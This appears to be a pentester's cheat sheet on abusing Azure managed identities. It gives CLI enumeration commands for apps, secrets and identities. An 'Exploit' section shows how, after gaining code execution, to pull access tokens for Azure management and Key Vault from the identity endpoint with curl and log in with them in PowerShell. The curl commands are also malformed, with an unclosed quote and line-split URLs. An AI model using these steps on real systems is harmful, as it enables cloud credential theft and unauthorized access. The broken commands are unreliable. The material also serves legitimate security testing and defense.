___
If a resource needs access to another system, such as a webapp needed database access, you can give it a "managed identity" which allows it to auth to another resource.




## Enumeration
---
### Azure CLI

**List all applications**
```bash
az ad app list
az ad app list --query "[].[displayName,appId]" -o table
```

**Get app information**
```bash
az ad app show --id <app-id>
```

**Search apps by name**
```bash
az ad app list --all --query "[?contains(displayName,'Test')].displayName"
```

**Get owner of an app**
```bash
az ad app owner list --id <app-id> --query "[].[displayName]" -o table
```

**Get apps owned by current user**
```bash
az ad app list --show-mine
```

**Get apps generated with a secret or certificate**
```bash
az ad app list --query '[?length(keyCredentials) > `0` || length(passwordCredentials) > `0`].[displayName, appId, keyCredentials, passwordCredentials]' -o json
```

**Get all managed identities with their SP**
```bash
az identity list --output table
```




### Identify
----
If you get code exec on a resource, check environment variables for
```bash
IDENTITY_HEADER=
IDENTITY_ENDPOINT=

or

MSI_ENDPOINT=
MSI_SECRET=
```

### Exploit
---

You can use these two env vars to request an access token from the azure metadata provider for the azure management api.

```bash
curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER $IDENTITY_ENDPOINT?
resource=https://management.azure.com&api-version=2019-08-01"
```

or for azure vault
```bash
curl -s -H "X-Identity-Header: $IDENTITY_HEADER
$IDENTITY_ENDPOINT?api-version=2019-08-
01&resource=https://vault.azure.net"
```


Then, decode the JWT to understand for about the permissions. 

**Auth with token**
```powershell
$accesstoken = "<YOUR-TOKEN>"
$accountid = "is required but not validated"
Connect-AzAccount -AccessToken $accesstoken -AccountID $accountid
```

Check access
```
Get-AzResource
```